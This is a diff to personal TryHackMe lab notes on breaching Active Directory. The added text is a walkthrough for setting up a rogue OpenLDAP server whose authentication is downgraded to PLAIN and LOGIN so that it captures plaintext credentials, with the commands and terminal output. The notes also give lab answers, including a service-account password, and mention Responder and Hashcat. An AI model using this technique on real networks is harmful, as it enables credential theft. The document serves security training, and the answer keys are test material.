@@ -1,6 +1,7 @@
 # Breaching Active Directory
 
-This particular module requires immutable to disabled on /etc/resolv.conf. If not the change of resolv-dnsmasq wont take to resolv.conf when systemctl restart dnsmasq is run:
+- This first section is dependent on the attackbox, resolv-dnsmask is not in kali vm by default but is on attackbox from THM website. So if using VM and VPN just add THMDC IP to the /etc/resolv.conf file. 
+- This particular module requires immutable to disabled on /etc/resolv.conf. Or all connections will be on 127.0.0.1, which may cause issues later.  If not the change of resolv-dnsmasq wont take to resolv.conf when systemctl restart dnsmasq is run:
 
 ```
 Check the permissions 'i' is immutable attribute
@@ -399,12 +400,110 @@ To capture plaintext credentials, you must:
 - Run OpenLDAP as a rogue server.
 - Downgrade its supported authentication mechanisms to only: PLAIN and LOGIN
 
-This is done using an LDIF patch:
+This is done using an LDIF patch ( create file olcSaslSecProps.ldif containing the following):
 
 ```
 dn: cn=config
 replace: olcSaslSecProps
 olcSaslSecProps: noanonymous,minssf=0,passcred
+```
+After installing slapd, run 
+
+```
+$ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo stemctl enable slapd
+$ sudo dpkg-reconfigure -p low slapd
+  Omitting slapd configuration as requested.
+slapd.service is a disabled or a static unit not running, not starting it.
+                                                                                              
+$ sudo dpkg-reconfigure -p low slapd                                
+  Backing up /etc/ldap/slapd.d in /var/backups/slapd-2.6.10+dfsg-1+b2... done.
+  Moving old database directory to /var/backups:
+  - directory unknown... done.
+  Creating initial configuration... done.
+  Creating LDAP directory... done.
+slapd.service is a disabled or a static unit not running, not starting it.
+
+#  olcSaslSecProps.ldif.txt  created just rename it
+                                                                                              
+$ ls                                                                
+ Modified_ntlm_passwordspray_response_text.py   passwordsprayer-1647011410194
+ olcSaslSecProps.ldif.txt                      'response_text_added to python.txt'
+ passwordlist-1647876320267.txt                 slapd_password.txt
+                                                                                              
+$ mv olcSaslSecProps.ldif.txt olcSaslSecProps.ldif     
+                                                                                              
+# slapd not working fix it
+$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
+ldap_sasl_interactive_bind: Can't contact LDAP server (-1)
+                                                                                              
+$ dpkg -l | grep slapd
+ii  slapd                                  2.6.10+dfsg-1+b2                         amd64        OpenLDAP server (slapd)
+                                                                                              
+$ sudo service slapd start               
+                                                                                              
+$ sudo systemctl start slapd             
+
+# status its running now                                                                                              
+$ sudo systemctl status slapd
+● slapd.service - OpenLDAP Server Daemon
+     Loaded: loaded (/usr/lib/systemd/system/slapd.service; disabled; preset: disabled)
+     Active: active (running) since Mon 2026-06-08 04:49:18 AEST; 34s ago
+ Invocation: 1467c00d202d484fb77e3643df18baf6
+       Docs: man:slapd
+             man:slapd-config
+             man:slapd-mdb
+   Main PID: 44788 (slapd)
+      Tasks: 3 (limit: 2037)
+     Memory: 3.3M (peak: 3.5M)
+        CPU: 24ms
+     CGroup: /system.slice/slapd.service
+             └─44788 /usr/sbin/slapd -d0 -h "ldap:/// ldapi:///" -u openldap -g openldap
+
+Jun 08 04:49:18 hacktop systemd[1]: Starting slapd.service - OpenLDAP Server Daemon...
+Jun 08 04:49:18 hacktop slapd[44788]: @(#) $OpenLDAP: slapd 2.6.10+dfsg-1+b2 (Apr 29 2026 10:>
+                                              Debian OpenLDAP Maintainers <pkg-openldap-devel>
+Jun 08 04:49:18 hacktop slapd[44788]: slapd starting
+Jun 08 04:49:18 hacktop systemd[1]: Started slapd.service - OpenLDAP Server Daemon.
+                                                                                              
+$ sudo ls /run/slapd/ldapi
+/run/slapd/ldapi
+                                                                                              
+$ sudo netstat -tulnp | grep slapd
+tcp        0      0 0.0.0.0:389             0.0.0.0:*               LISTEN      44788/slapd         
+tcp6       0      0 :::389                  :::*                    LISTEN      44788/slapd         
+                                                                                              
+# now its working as expected
+$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif 
+SASL/EXTERNAL authentication started
+SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
+SASL SSF: 0
+modifying entry "cn=config"
+
+                                                                                              
+$ sudo service slapd restart 
+                                                                                              
+$ ldapsearch -H ldap:// -x LLL -s base -b "" supportedSASLMechanisms
+# extended LDIF
+#
+# LDAPv3
+# base <> with scope baseObject
+# filter: (objectclass=*)
+# requesting: LLL supportedSASLMechanisms 
+#
+
+#
+dn:
+supportedSASLMechanisms: PLAIN
+supportedSASLMechanisms: LOGIN
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+                                                                                              
+$ 
 ```
 This forces the printer to authenticate using insecure methods.
 
@@ -436,6 +535,8 @@ Answer: LOGIN, PLAIN
 ### Q3 What is the password associated with the svcLDAP account? 
 
 Anwswer: tryhackmeldappass1@
+
+
 
 ## Task 4 Authentication Relays
 
@@ -524,3 +625,4 @@ What tool is used to poison and capture authentication requests?	Responder
 What is the username associated with the captured challenge?	(You will find this in your Responder output — format: ZA\\username)
 What is the cracked password?	(You will get this after running Hashcat on your captured hash)
 
+Setting up slapd required some work: but in the end got 
